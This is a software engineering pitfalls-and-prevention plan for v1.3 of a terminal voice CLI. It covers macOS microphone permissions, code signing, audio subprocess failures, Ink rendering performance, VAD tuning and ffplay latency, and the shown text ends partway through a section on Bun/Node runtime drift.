# Pitfalls Research — v1.3 Terminal-only Achilles

**Domain:** Single-binary terminal voice CLI (Bun-compiled, Ink TUI, sox/ffplay subprocesses, ElevenLabs WSS, claude -p subprocess) shipped as both an npm package and a Claude Code skill.
**Researched:** 2026-06-08
**Confidence:** HIGH for the v1.2-failure-mode replays (root-caused in `.planning/debug/achilles-silent-launch.md`); HIGH for macOS TCC parent-process attribution (microsoft/vscode#307364 + Apple TCC docs verified); HIGH for the Bun cold-start / WSS / spawn surface (the v1.3-terminal-pivot.md research is implementation-ready); MEDIUM for ffplay buffering choice (low-latency flags well-documented but our specific chunk schedule unverified end-to-end); MEDIUM for Ink reconciliation at 20fps with a 7x7 blob + 40-cell sparkline (cap is 30fps, headroom exists, but no published numbers for this specific surface).

**Scope:** This document is the v1.3-specific replay-prevention catalogue. Every pitfall is mapped to a concrete v1.3 phase (Phase 15–20 per `.planning/research/v1.3-terminal-pivot.md` §11) and every prevention strategy specifies the verification gate (integration test, real-binary smoke, real-mic capture, real-WSS round-trip) rather than the generic "test thoroughly" advice.

**Top-of-document warning that drives every section below:** The v1.2 audit graded `tech_debt` with all 30 requirements "code-side verified," and the binary shipped DOA — the renderer voice loop was wholly unwired and `apps/achilles-cli/src/commands/launch.ts:155` set `stdio: "ignore"` so the launching terminal could not see the missing pieces. v1.3 must structurally prevent the same shape of failure. The single most important new gate this milestone introduces is a **real-binary smoke test that asserts an audible TTS round-trip from a freshly-installed npm/bunx invocation, not a MOCK_LOOP=1 in-process synthetic** — see Pitfall 1 below for the verification contract.

---

## Critical Pitfalls

### Pitfall 1: "Verified code-side but broken in the shipped binary" (the v1.2 silent-launch replay)

**What goes wrong:**
The renderer voice loop is fully unit-tested, the orchestrator is fully integration-tested under `MOCK_LOOP=1`, every requirement has code evidence, the auditor signs off — and the user runs the shipped binary and nothing happens. v1.2 shipped exactly this failure: main minted an STT token, broadcast `IPC_STT_TOKEN`, registered receivers for `IPC_UTTERANCE_COMMIT` / `IPC_MIC_FRAME` / `IPC_STT_TOKEN_REQUEST` / `IPC_TTS_PLAYBACK_COMPLETE` — but the preload (`apps/achilles/src/preload/index.ts`) never exposed any of those channels on `window.achilles`, the renderer (`apps/achilles/src/renderer/App.tsx`) never instantiated `createMicCapture` or `createPlaybackQueue`, never opened a Scribe v2 WSS, and never sent an utterance commit. The visible blob pulse was the mock-amplitude stream wired in `apps/achilles/src/main/index.ts:328`, decoupled from real mic level. Result: every audit checkmark held in isolation; the seam between two phases (mock-loop integration vs. renderer composition root) was the unverified gap; the integration test surface never exercised the real Bun binary against real ElevenLabs against real Claude.

v1.3 has at least eight new seams that can replay this shape:
1. Bun-compiled binary vs. JS-bundle fallback (`optionalDependencies` path)
2. `sox` child process exit vs. our handler vs. our mic-frame consumer
3. `ffplay` stdin pipe vs. voice-tts `events$` async iterator vs. drain detection
4. Energy-threshold VAD `observe()` callback vs. STT `committed` event vs. the orchestrator `commitText`
5. Bun `child_process.spawn` of `claude` vs. LDJSON line parser chunk boundaries vs. ack extraction
6. Skill body `Bash(achilles voice *)` invocation vs. process lifecycle vs. SIGINT propagation
7. Ink `<Text>` paint of braille sparkline vs. amplitude state update vs. 50ms interval
8. Suspend/resume / device hot-swap signal source on macOS without Electron `powerMonitor`

**Why it happens:**
"Verified in isolation" feels like a complete verification because every test runs green. The gap is psychological as much as procedural — the auditor has no integration test that runs the actual installable npm package against actual ElevenLabs against actual `claude -p` from a clean machine. The v1.2 audit explicitly routed "live ElevenLabs + real claude end-to-end" to the release operator (see §5.1 of `.planning/milestones/v1.2-MILESTONE-AUDIT.md`); the release operator did not run that check before the user did.

**How to avoid:**
Build the real-binary smoke contract into Phase 20 as a phase-level success criterion (not as a deferred operator task). Specifically:
- **PHASE 20 SC-1 (RBS — Real-Binary Smoke):** From a fresh OS user account, `npm install -g achilles@<this-build>` → `achilles init` → `achilles voice` → speak the phrase "hello achilles" → observe an audible TTS acknowledgement within 3 seconds and a `<spoken-summary>` echo within 8 seconds. Recorded as an asciicast (`asciinema rec`) + an audio capture of the speaker output. The asciicast is committed to `.planning/milestones/v1.3-evidence/rbs-darwin-arm64.cast` (and per other platform). The auditor cannot mark v1.3 `passed` without three asciicasts (darwin-arm64, linux-x64, win32-x64) plus their paired wav captures.
- **PHASE 20 SC-2 (RBSe — Real-Binary Skill):** From the same fresh account, after the npm install, run `achilles install-skill`, restart Claude Code, invoke the skill from inside Claude Code with "use voice," confirm that the skill body launches `achilles voice` foreground, the same audible round-trip succeeds, and Ctrl-C in the terminal cleanly tears down the `achilles` process AND the `claude -p` subprocess AND the sox + ffplay children AND closes the STT/TTS WSS connections. Recorded similarly. (Skill UX bug anthropics/claude-code#60515 means we ALSO need to confirm the second Bash call in a skill body does not re-prompt for permission — surface that as part of the recording.)
- **PHASE 20 SC-3 (RBP — Real-Binary Persistence):** With `--save-transcripts`, run a 3-utterance session, then `achilles transcripts list` and `achilles transcripts purge` must find the JSONL, list it, and delete it. From the real binary. Recorded.
- **PHASE 17 PROBE — Smoke surface that runs in CI on every PR**: spawn the local-dev `bun run src/cli.ts voice --mock-mic --mock-elevenlabs --mock-claude` (a fully-internal triple-mock that nonetheless instantiates the real Ink tree + real sox subprocess shape against a synthetic byte stream) and assert the orchestrator transitions through `listening → processing → speaking → idle` end-to-end in under 5 seconds. This is the existing `MOCK_LOOP=1` test ported to the in-process orchestrator. It does NOT replace SC-1/2/3 — it is the upstream gate that catches refactor breakage before Phase 20 verification.
- **Forbid `stdio: "ignore"` on the launch path.** The v1.2 CLI launched the Electron app detached with `stdio: "ignore"` (`apps/achilles-cli/src/commands/launch.ts:155`) so the launching terminal never saw the `[achilles]` console.error lines. v1.3 must run foreground with `stdio: "inherit"` and an explicit `--quiet` flag for users who want the headless behaviour. A lint rule in the test suite greps for `stdio.*ignore` on the launch path and fails the build if found.

**Warning signs:**
- The "passing" assertion never spawns the actual compiled binary from `dist/`.
- The integration test injects fake WebSocket / fake spawn / fake stdout.
- The CI matrix builds the binary but never runs it against a network.
- The audit document includes the words "routed to release operator."
- A new seam (e.g., "VAD start of utterance" → "STT commit") has unit tests on each side but no end-to-end test that exercises the seam under real timing.

**Phase to address:** Phase 17 (CI in-process smoke gate) + **Phase 20 (real-binary asciicasts as SC-1/2/3)**. The auditor MUST require the asciicasts to mark v1.3 anything other than `tech_debt`.

---

### Pitfall 2: macOS TCC microphone permission attributed to the wrong process (VS Code / Cursor / iTerm / Terminal.app divergence)

**What goes wrong:**
The user runs `achilles voice` from inside VS Code's integrated terminal (or Cursor's terminal, or via Claude Code's Bash tool inside Cursor). sox tries to open the default mic. macOS TCC walks up the process tree looking for a responsible process with `NSMicrophoneUsageDescription` set in its Info.plist, AND a code signature, AND an existing TCC grant for the bundle ID. The "responsible process" resolution in 2026 macOS lands on the parent GUI app — VS Code or Cursor — NOT on `achilles`. If that GUI app has its own mic grant, sox inherits it and works fine. If it does not, sox fails with EPERM and:

- On macOS Sequoia and later, the kernel may NOT prompt the user at all — child processes invoked from VS Code's terminal often "cannot request TCC permissions" (microsoft/vscode#307364, May 2026; pingdotgg/t3code#728 confirms the same shape for camera + mic). The user sees "nothing happens" — same shape as the v1.2 silent-launch failure.
- On macOS Sonoma and earlier, the prompt may fire but be attributed to "Visual Studio Code" or "Cursor" or "iTerm2" — confusing the user who launched a tool called `achilles`.
- On iTerm2 / Terminal.app / ghostty (which DO have the mic entitlement), the prompt fires correctly the first time AND the grant is persisted under the terminal emulator's bundle ID.
- Across reboots and terminal-app updates, the grant can silently drop (TCC.db corruption + `tccutil reset Microphone` confusion).

When `achilles voice` is launched FROM a Claude Code skill body, the responsible process is Claude Code itself — which is a Bun binary with its own bundle ID and its own (or missing) entitlement state. The skill UX is "first invocation works because user already granted Claude Code mic access" OR "first invocation silently fails because Claude Code was installed via npm and has no mic entitlement."

**Why it happens:**
The TCC framework attributes permission to the GUI ancestor for child processes, not to the leaf binary that actually opens the audio device. This is a security feature documented in Apple's TCC docs and reverse-engineered in HackTricks. macOS Sequoia tightened it further. Developers writing CLI tools think of "macOS mic permission" as a thing their tool requests; in reality the request is made BY their tool ON BEHALF OF the GUI ancestor.

The v1.2 code took the easy path: spawn an Electron app, which is a signed GUI process with `NSMicrophoneUsageDescription`, and let Electron call `systemPreferences.askForMediaAccess`. v1.3 deletes the Electron app — there is no GUI ancestor we control. We inherit whatever the user's terminal has (or doesn't have).

**How to avoid:**
- **Phase 18 (init wizard) must include an `achilles init` step that runs a 1-second sox open against the default device, catches EPERM/EACCES, and prints a per-terminal-emulator remediation script.** The script must:
  1. Detect the parent terminal emulator by walking `ps` from our PID upward and matching against a table of known terminal bundle IDs.
  2. For VS Code / Cursor: print "VS Code's integrated terminal cannot prompt for microphone access. Open Terminal.app, run `achilles init` ONCE there to grant mic access at the system level, then return to VS Code." (microsoft/vscode#307364 confirms this is the only safe path as of mid-2026.)
  3. For iTerm2 / Terminal.app / ghostty / Warp: print "macOS will prompt for microphone access. Click Allow. The grant persists for {{terminal.bundleId}}." Then trigger the open + sleep 1 second.
  4. For unknown terminals: print "Your terminal emulator is not in our known-good list. The macOS mic prompt may not fire. Open System Settings → Privacy & Security → Microphone and add {{parentBundlePath}} manually."
- **Phase 18 must NOT auto-launch `achilles voice` after `achilles init`** — the user must close the init wizard, then run `achilles voice` so the grant has settled into the TCC database (TCC writes are not synchronous to the prompt). v1.2 had this race: the smoke test in init-wizard fired BEFORE the user's Allow click had persisted, so the smoke test sometimes failed even though the grant succeeded.
- **Phase 19 (skill install) must include a one-time check in the SKILL.md body:** before the first `achilles voice` invocation inside a skill, run `achilles init --skill-check` which verifies the responsible-process resolution against the Claude Code parent. If the check fails, the skill prints the per-terminal remediation script BEFORE invoking voice. This is the only way to avoid the "skill silently does nothing" failure shape.
- **Phase 20 SC-1 must include a test on macOS-arm64 invoked from inside VS Code's integrated terminal**, not only from Terminal.app. The asciicast must show the EPERM-and-recover flow if the user has not pre-granted mic to VS Code, OR the success flow if they have. The auditor compares the asciicast to the documented remediation script.

**Warning signs:**
- The auditor's test environment is iTerm2 (which has the entitlement) and the user's environment is VS Code (which sometimes does not).
- The `which sox` check passes but `rec -q -t raw -r 16000 -b 16 -e signed -c 1 - | head -c 1` hangs or returns nothing.
- `tccutil reset Microphone com.apple.Terminal` or `tccutil reset Microphone com.microsoft.VSCode` "fixes" the issue temporarily — confirming TCC attribution to the parent.
- Users report "I clicked Allow but it doesn't work" — TCC write race (point 4 above).

**Phase to address:** **Phase 18 (init wizard remediation script) + Phase 19 (skill body pre-flight)**. NOT Phase 16 (mic capture itself) — the capture code is correct; the failure is at the OS permission boundary above the code.

---

### Pitfall 3: macOS Gatekeeper / quarantine on the Bun-compiled binary blocks first launch

**What goes wrong:**
The user runs `npm install -g achilles`. npm pulls down the per-platform `@achilles/cli-darwin-arm64` package which contains a Bun-compiled binary. The binary is written to a node_modules directory. The user runs `achilles voice`. macOS Gatekeeper checks the binary for a code signature + notarisation ticket. If the binary is unsigned, the kernel either:
- (Sonoma and earlier) Prompts the user with "achilles cannot be opened because the developer cannot be verified." User clicks Cancel. The binary never runs.
- (Sequoia and later, with the tightened quarantine rules) Refuses to launch the binary entirely. The user sees `zsh: killed: achilles` or similar with no UI prompt.
- (Any version, if `npm install` was invoked with `sudo`) The binary may not get the quarantine xattr at all, masking the problem in dev but breaking when users install non-sudo.

Bun's own docs (bun.com/docs/guides/runtime/codesign-macos-executable) document the `codesign` + `notarytool` workflow but note that "for standalone Mach-O executables, you cannot staple a ticket" — meaning the user must always be online for Gatekeeper to verify, AND the binary must be deep-signed because it embeds a Bun runtime, a JS blob, and our skill assets. (bun#7208 originally tracked the inability to deep-sign Bun-compiled binaries; resolved in Bun 1.2+ but only with the right `--deep` flag.)

The v1.2 silent-launch debug noted the user manually ran `xattr -dr com.apple.quarantine apps/achilles/dist-installers/mac-arm64/Achilles.app` to bypass Gatekeeper. v1.3 cannot rely on users typing xattr commands.

**Why it happens:**
Apple Developer ID + notarisation is a $99/year + bandwidth + tooling commitment that small projects skip until first user complains. The v1.2 release operator owns this acquisition step (`.planning/milestones/v1.2-MILESTONE-AUDIT.md` §5.2) and it was named as a known blocker since Phase 13 planning. As of v1.2 ship, the acquisition had not happened.

**How to avoid:**
- **Phase 19 (distribution) must have a binary decision at the top: signed or unsigned for this release.** If signed:
  1. Acquire Apple Developer ID before Phase 19 starts (release operator owned, but the milestone start MUST gate on it — do not let Phase 19 begin without the cert in hand).
  2. Build the per-platform Bun binary, then run `codesign --entitlements entitlements.plist --deep --options runtime --sign "Developer ID Application: ..." achilles --force --timestamp`.
  3. Submit to `notarytool submit achilles.zip --apple-id <id> --team-id <team> --password <app-specific> --wait`.
  4. Verify with `spctl --assess --type execute --verbose achilles` from a fresh macOS account.
  5. Publish the per-platform package to npm AFTER notarisation succeeds. Do not publish the unsigned binary as a "we'll resign later" promise — npm tarballs are immutable.
- If unsigned (v1.3 beta only, not v1.3 stable):
  1. The npm package `postinstall` script (Phase 19) MUST print a clear macOS-specific instruction with the exact `xattr -dr com.apple.quarantine $(npm root -g)/achilles/node_modules/@achilles/cli-darwin-arm64/achilles` line. Do NOT auto-run xattr — Apple specifically forbids tools that strip quarantine programmatically (this can trigger anti-malware heuristics).
  2. The README must lead with "macOS users on a v1.3 beta: this binary is unsigned. Run the xattr line above first." Do not bury it.
  3. Ship a Node-bundle fallback path in `dist/cli.js` that runs under Node 22+ if Bun-compiled binary is quarantined. Cold-start cost is 5-10x higher (~80ms vs. ~15ms — `.planning/research/v1.3-terminal-pivot.md` §3.3) but the binary runs. Detect the quarantine state in the bin shim by attempting to exec the Bun binary; on `code === null` and `signal === 'SIGKILL'` within 200ms, retry under Node.
- **Phase 20 SC-1 must include the codesign + notarytool verification asciicast on darwin-arm64.** The asciicast captures `spctl --assess` output proving Gatekeeper allows the binary. If the cert is missing at Phase 20 start, v1.3 ships as v1.3.0-beta, not v1.3.0.
- For Windows: ship unsigned for v1.3 (EV Code Signing certs are expensive — $300-700/year; SmartScreen reputational signing is acceptable to most users). Surface the SmartScreen "More info → Run anyway" instruction in the README. Phase 19 verification is `signtool verify /v /pa achilles.exe` for the unsigned case (assert "No signature was present" — confirming we know it's unsigned, not that we forgot to sign).
- For Linux: AppImage is not the v1.3 distribution path — we ship a plain Bun-compiled ELF. No signing required, but ship with `chmod +x` baked in by the npm tarball.

**Warning signs:**
- The user reports "achilles command not found" but `which achilles` returns a path — meaning the binary IS on PATH but Gatekeeper killed the exec.
- `Console.app` shows `taskgated-helper` denying the binary.
- The binary works on the dev machine (where the dev's Apple ID is trusted) but fails on a fresh account.
- `spctl --assess --type execute --verbose` returns `rejected (the code is not signed at all)`.

**Phase to address:** **Phase 19 (signed-binary build pipeline) and the Phase 19 release-gate decision (signed vs. unsigned beta).** The cert acquisition deadline is the start of Phase 19.

---

### Pitfall 4: sox / ffmpeg detection failure mode is too quiet (`which` succeeds but device open fails)

**What goes wrong:**
The init wizard runs `which sox` and `which ffplay` — both return paths. The wizard proudly proceeds. The user runs `achilles voice`. sox spawns and immediately exits with stderr "no default device" or "device unavailable" (PipeWire socket not present, PulseAudio dead, Bluetooth headset in HFP mode without write access, default device set to "AirPods" that aren't connected). `achilles voice` sees the spawn succeed (the binary is on PATH; the child started) and then sees the exit code seconds later. Without explicit handling, the orchestrator stays in `idle` forever waiting for mic frames that never come — same v1.2 silent shape.

ffplay has the same failure mode (no audio output device, ALSA misconfigured, JACK running and stealing the default device, no PulseAudio). The voice-tts WSS opens, the chunks arrive, ffplay's stdin gets bytes — but ffplay's audio output device is dead so nothing plays.

There is a worse variant: sox on Apple Silicon M3/M4 with an Intel-only sox binary from SourceForge throws `spawn Unknown system error -86` (sox-recompiled README documents this, June 2025). The Homebrew arm64 binary at `/opt/homebrew/bin/sox` works; the SourceForge x86 binary translated via Rosetta sometimes does not.

**Why it happens:**
`which` answers a question about PATH lookup, not device availability. Audio device state is a runtime concern that depends on which other applications are running, whether the system has been suspended, whether the user changed default output via Bluetooth menu, etc. The natural CLI pattern is to assume the tool works if `which` finds it; this assumption breaks for audio specifically.

**How to avoid:**
- **Phase 18 init wizard must do a 1-second `rec` open + `ffplay` open + an audio round-trip ("play a 0.5-second test tone, capture it from the mic, assert non-zero amplitude") — not merely `which`.** Capture stderr from both subprocesses. If exit code is nonzero, parse the stderr against a known-error table:
  - "no default device" → "Open System Settings → Sound and ensure an input device is selected."
  - "device unavailable" → "Close other apps using the microphone (Zoom, Discord) and retry."
  - "Unknown system error -86" → "Your sox binary is x86_64 but you're on Apple Silicon. Run `brew uninstall sox && brew install sox` to install the arm64 build." (Or fall back to the sox-recompiled M3/M4 binary path; document the URL.)
  - "PA_INVALID_ARGUMENT" → "PulseAudio is not configured for default capture device. Run `pactl list sources short` to inspect."
- **Phase 18 detection must also assert sox version >= 14.4.2 for arm64 compatibility.** `sox --version | head -n 1`. Older versions on arm64 Homebrew predate the arm64 fixes.
- **Phase 18 detection must run BEFORE recording the API key.** v1.2 init wizard recorded the API key first, then ran the smoke test. If the smoke test failed, the user had already typed an API key into the prompt — confusing UX. v1.3 inverts: detect tools → detect devices → record key → smoke test.
- **Phase 16 (mic capture) must wire a child-exit handler that distinguishes "graceful stop" (we sent SIGTERM, exit code is 143) from "device died" (exit code 1 or 2, stderr contains keywords).** On device-died, restart sox up to 3 times within 10 seconds (per `.planning/research/v1.3-terminal-pivot.md` §10.5); after the 3rd failure, surface an in-Ink error banner and degrade to `TypedFallback` mode (per the existing v1.2 incident-detection pattern).
- **Phase 20 SC-1 must run on a machine WITHOUT ffmpeg installed** to confirm the init wizard catches the missing tool and the error message points the user to `brew install ffmpeg`. Do not run Phase 20 SC-1 only on a machine where the dev already has ffmpeg installed — the SC asserts the user-onboarding path.

**Warning signs:**
- User runs `achilles voice`, the Ink shell appears, the blob breathes, but no transcript ever materialises. (Sox exited; we didn't notice.)
- The init wizard prints "all good" but `achilles voice` immediately exits with `Error: spawn EACCES` (sox was on PATH but not executable for the current user).
- Stderr from sox is captured but never surfaced to the user (logged to `~/.achilles/voice.log` but the user doesn't look there).

**Phase to address:** **Phase 18 (init wizard real-device smoke) + Phase 16 (mic-capture exit-code handler)**. The Phase 18 smoke is the "looks done but isn't" gate.

---

### Pitfall 5: Ink reconciliation thrash from 20fps amplitude updates collapses CLI responsiveness

**What goes wrong:**
The braille sparkline updates every 50ms (20fps target). The blob updates every 50ms. The state-line transcript updates whenever a partial arrives from STT (potentially every 100ms during fast speech). Each update calls `setState` somewhere in the React tree. Ink's reconciler does a full-tree traversal on every state change and computes the diff against the previous frame (per atxtechbro/test-ink-flickering and the heise.de Ink 7.0 writeup — Ink reissues the entire frame, not the changed cells). The traversal cost depends on the tree depth, the layout calculation cost of Yoga, and any string-allocation churn from `<Text>` children. At 20fps + partial-transcript updates concurrent, the reconciler can sit at 30-60% of one core. The terminal scroll buffer floods. Input handling (Ctrl-C) gets queued behind the renderer.

The other failure mode is **flickering**: Ink redraws the entire frame on each tick, which on slow terminals (Apple Terminal.app, some Windows Terminal versions) shows a visible flash. The dev sees the flash, panics, drops to 10fps — and now the blob looks janky.

**Why it happens:**
Ink's design philosophy is "easy React in the terminal" — it makes simple TUIs trivial but its diffing model wasn't built for animation. The 30fps cap is enforced internally (Ink discussion #657) but it's a cap, not a guarantee that animation up to that cap is cheap.

**How to avoid:**
- **Phase 16 must include an Ink perf budget**: animate-at-20fps with the production blob (7x7 grid) + sparkline (40 cells) + state line for 10 minutes on the slowest target platform (Windows Terminal on a 2019-vintage laptop), measure peak CPU, and assert <10% of one core. If the budget fails:
  1. Promote the blob + sparkline to a single `<Text>` with a precomputed multi-line string built outside the React tree (a single `setState` per tick instead of 7 + 1 + 1).
  2. Use `useDeferredValue` on the partial-transcript stream so partials don't compete with the 20fps tick.
  3. Use `useEffectEvent` (Ink 7.0+ pattern) for the Ctrl-C handler so it doesn't re-register on every render.
  4. If perf still fails, drop to log-update (raw ANSI) for the animated region — keep Ink for the surrounding shell, layer the animated braille onto a fixed-position cursor write. This is the "Ink for structure, raw ANSI for animation" hybrid documented in `.planning/research/v1.3-terminal-pivot.md` §4.3.
- **Throttle partial transcripts to 10fps before they reach the React tree.** The voice-stt `events$` async iterable will emit partials whenever Scribe pushes them; the orchestrator wraps the emit in `requestAnimationFrame`-equivalent throttling before calling `setState`. (Throttle, not debounce — debounce drops trailing updates; throttle preserves them on a cadence.)
- **NEVER re-mount the Ink root on state changes.** The reducer pattern from v1.2 (`apps/achilles/src/renderer/state/useAchillesState.ts`) survives — keep one root, one reducer, one subscription point, drive everything from a single store.
- **Phase 16 must add a slowest-terminal smoke target**: render the production shell at 20fps in Windows Terminal v1.18 (the version shipped on most enterprise Windows 11 installs as of 2026) and assert no visible flicker via a 30-second screen capture compared against a still frame.

**Warning signs:**
- The blob "stutters" or "jitters" on the dev's machine but is "fine in the test runner."
- `top` shows the `achilles` process at >20% CPU during idle.
- Ctrl-C takes >500ms to register (input handling queued behind renders).
- The terminal scroll buffer fills with what looks like duplicate frames — Ink wrote a full frame and the terminal didn't recognise it as a delta.

**Phase to address:** **Phase 16 (TUI shell + Ink perf budget)**. The dev MUST measure CPU during animation and fail the phase if budget exceeded.

---

### Pitfall 6: Energy-threshold VAD false-starts in noisy rooms / misses speech in quiet rooms

**What goes wrong:**
The default thresholds in `.planning/research/v1.3-terminal-pivot.md` §7.2 are `VOICE_THRESHOLD = 0.02`, `SILENCE_THRESHOLD = 0.01`. These are fine for a quiet office at 22 dBA ambient. They fail in three directions:
- **Coffee shop / open office (50-65 dBA):** the noise floor itself is above VOICE_THRESHOLD. VAD enters "voice" state immediately and never exits. STT WSS is open continuously, billing ElevenLabs for nothing.
- **Soft voice / far mic (<35 dBA at source):** RMS never exceeds VOICE_THRESHOLD. User speaks; nothing happens. Same v1.2 silent-launch shape from a different cause.
- **Bursty noise (keyboard clack, mouse click):** RMS spikes >VOICE_THRESHOLD for <100ms. The 60ms VOICE_HOLD_MS window can be crossed by a single keyboard press. STT opens for a 200ms commit then closes — the WSS handshake overhead alone is more than the captured audio.

The literature (arxiv 2312.05815, picovoice 2026 guide, vexyl.ai threshold guide) consistently recommends adaptive thresholds: estimate the noise floor over a 1-2 second window, set VOICE_THRESHOLD at 10-15 dB above the floor, and update continuously. Static thresholds break.

There's a worse variant for v1.3: TTS playback through speakers (no headphones) bleeds into the mic. The half-duplex gate (`SPEAKING_DEBOUNCE_MS = 300`) handles the obvious case — pause mic during speaking — but the bleed continues for 100-300ms after the playback drains (room reverb + speaker driver decay). The VAD sees the tail of our own TTS as the start of the user's next utterance and "commits" garbage to STT. The audit `.planning/milestones/v1.2-MILESTONE-AUDIT.md` §1 lists LOOP-05 as `verified` but flagged "Physical audio loop requires human" — meaning self-trigger was never measured.

**How to avoid:**
- **Phase 16 must ship adaptive thresholds**: track an EWMA noise floor with α=0.05 over the last 2 seconds of frames classified as "silence." Set `VOICE_THRESHOLD = noiseFloor * 3` (~10 dB above floor, see Wikipedia VAD article). On every frame, update `noiseFloor` if state is "silence" and current RMS < 1.5x prior floor (so a hand clap doesn't poison the floor estimate). Cap `noiseFloor` at 0.001 (a hard minimum) so we don't drop below the noise of the ADC itself.
- **Phase 18 init wizard must include a 5-second "ambient calibration" step**: prompt the user "stay silent for 5 seconds while we measure your room noise," collect the noise floor, persist to `~/.achilles/settings.json` as the initial estimate. The runtime EWMA continues to adapt from there.
- **Phase 16 must add a self-trigger guard**: after `tts_playback_complete` + the 300ms SPEAKING_DEBOUNCE_MS, instead of immediately re-arming VAD, run an additional 500ms "post-speech silence verification" — require that the noise floor estimate during that 500ms is consistent with the pre-speech floor before re-arming. If the floor is elevated, extend the debounce until it settles. (This catches room reverb + bleed.)
- **Phase 16 must enforce a minimum-utterance-length floor**: ignore "speech_end" if the duration since "speech_start" was <300ms. A 200ms RMS spike from a keyboard click cannot commit a transcript.
- **Phase 16 must ship a `--debug-vad` flag** that streams the RMS, noise floor, threshold, and state to stderr at 50ms cadence. Without this, tuning in the field is impossible.
- **Phase 17 / 20 must include a real-environment field test asciicast in a noisy environment** (play a Spotify lo-fi playlist at 65 dBA from a phone next to the laptop). Assert that VAD does NOT continuously trigger on the music. Assert the user's voice still commits within 1s.

**Warning signs:**
- The asciicast shows transcripts committing during quiet stretches (the VAD is hallucinating speech).
- The dev tunes the threshold on their own quiet machine and it ships, then the first user in a busy office reports "it never stops listening."
- The latency-probe shows `stt_token_request` firing every 200ms (the WSS is being opened and closed in a tight loop).
- ElevenLabs Scribe billing spikes for sessions where the user said nothing.

**Phase to address:** **Phase 16 (VAD logic) + Phase 18 (calibration step) + Phase 20 (noisy-environment field test SC)**.

---

### Pitfall 7: ffplay buffering / latency tradeoff makes TTS feel laggy OR gappy

**What goes wrong:**
The voice-tts WSS emits `audio/mpeg` chunks per the `CHUNK_LENGTH_SCHEDULE = [80, 120, 160, 220]` (chars per chunk, mapping to ~200-500ms of audio each at typical TTS rates). ffplay sits between our stdin pipe and the OS audio device. ffplay's default behaviour for `-i pipe:0`:
- WITHOUT `-fflags nobuffer`: ffplay buffers ~512ms before starting playback (it needs a "warmup" before it commits to a sample rate). Total perceived latency from voice-tts first chunk to first audible sample: ~700-900ms. The ack feels delayed.
- WITH `-fflags nobuffer -flags low_delay -probesize 32 -analyzeduration 0`: ffplay starts playback at ~80-150ms. But if the upstream chunks arrive jittery, ffplay can underrun and insert a brief gap in the audio. The 2018 ffmpeg mailing-list thread (ffmpeg.narkive.com/l27ySmL6) documents the tradeoff: every flag that reduces buffering reduces resilience to upstream jitter.
- WITH `-infbuf` (the default for "realtime" inputs): ffplay never drops data — but if the buffer grows unbounded, mid-stream cancellation (the user says "stop" while ack is playing) takes seconds to actually stop.

The v1.2 PlaybackQueue in Web Audio handled this by decoding to AudioBuffer and scheduling via `audioCtx.currentTime + offset`. v1.3 with ffplay loses that precision — we rely on ffplay's internal scheduling, which is opaque.

The worse failure mode: voice-tts can emit chunks faster than playback consumes them (the WSS pushes the whole utterance before playback finishes the first chunk). ffplay's stdin pipe has a kernel-level buffer (~64KB on Linux, ~16KB on macOS). When that fills, voice-tts's writes block. If voice-tts is implemented with a synchronous `stdin.write`, the entire async iterable stalls. v1.2 didn't have this problem because the chunks went through Web Audio which decoded then scheduled.

**How to avoid:**
- **Phase 17 must benchmark ffplay flags against representative TTS chunks** (record a 5-second TTS sample, replay through ffplay with each flag combination, measure first-sample-out delay and underrun count over 100 trials):
  - Recommended starting point: `-nodisp -autoexit -loglevel error -fflags nobuffer -flags low_delay -probesize 32 -analyzeduration 0 -i pipe:0`. Add `-ac 1` to force mono if Scribe is mono.
  - If underruns appear: drop `-fflags nobuffer` first (it's the most aggressive), accept ~250ms latency.
  - If latency is still bad: switch from mp3_44100 to pcm_16000 (voice-tts supports the format change in constants); pcm skips MP3 decode, latency drops ~30ms. Cost is ~5x bandwidth on the WSS. Acceptable on local networks.
- **Phase 17 must implement backpressure correctly on ffplay's stdin**: use `stdin.write(chunk, callback)` and `await` the callback before continuing the for-await loop on `events$`. Bun's `child_process.spawn` stdin is a Node Writable; Bun-native `Bun.spawn` returns a `WritableStream`. EITHER way, the write must be awaited. Do NOT fire-and-forget.
- **Phase 17 must handle ffplay exit during a playback**: if ffplay dies mid-stream (audio device disappeared), the next `stdin.write` throws EPIPE. Catch EPIPE, mark state as "speaking_failed," fire the existing PROMPT-05 failure-override path ("I ran into a problem. tts_playback_failed").
- **Phase 17 must explicitly send EOF to ffplay's stdin when voice-tts emits `stream_complete`** (via `stdin.end()`) so `-autoexit` can drain naturally. Do NOT kill ffplay — `-autoexit` + EOF drains cleanly; SIGKILL truncates the audio.
- **Phase 17 must add a "user-cancel" path that sends SIGTERM to ffplay**: when the user says "stop" or hits Ctrl-C, we want the audio to stop NOW, not after ffplay drains its internal buffer. SIGTERM with a 1-second deadline to SIGKILL. Same pattern as the claude bridge cancellation chain.
- **Phase 20 SC must include a "ack-latency probe"**: measure the time from STT `committed` to first audible TTS sample (instrumented via the existing `latency-probe.ts`). Assert P50 < 500ms, P95 < 800ms (these are tighter than the v1.2 LOOP-06 P50<1000ms because v1.3 removes the IPC hop and the Web Audio decode).

**Warning signs:**
- The user says "achilles starts talking like a second after it should."
- ffplay stderr (when stripped of `-loglevel quiet`) shows "Buffer queue overflow" or "buffer underrun."
- voice-tts logs "stream_complete" but ffplay continues for >2 seconds.
- A mid-utterance cancel takes 3+ seconds to audibly stop.

**Phase to address:** **Phase 17 (orchestrator + ffplay playback subprocess)**. The benchmark + backpressure + cancel paths are all Phase 17 deliverables.

---

### Pitfall 8: Bun ↔ Node runtime drift (something works under Bun but not Node 22 or vice versa)

**What goes wrong:**
The v1.3 architecture ships a Bun-compiled binary on darwin/linux/win as the primary path AND a Node 22+ fallback via the `bin` shim (per `.planning/research/v1.3-terminal-pivot.md` §8.2). This means the same source `dist/cli.js` is consumed by two runtimes. Bun's compatibility is ~98% of top npm packages (PkgPulse 2026); the 2% that differs is exactly where audio + WebSocket + child_process work, and the differences are subtle:

- **WebSocket constructor**: Bun's native `WebSocket` is uWebSockets-backed, very fast, accepts the `["xi-realtime-token", token]` subprotocol array. Node 22's `ws` package accepts the same. Both emit `MessageEvent` on `message`. But: Bun's `WebSocket` `close` event has slightly different `code` semantics (uWebSockets returns 1000 on graceful, ws returns the server-sent code which can be 1006 if no close frame sent). The retry logic in `packages/voice-stt/src/realtime-client.ts` keys off the code; drift here means a tight reconnect loop under one runtime and not the other.
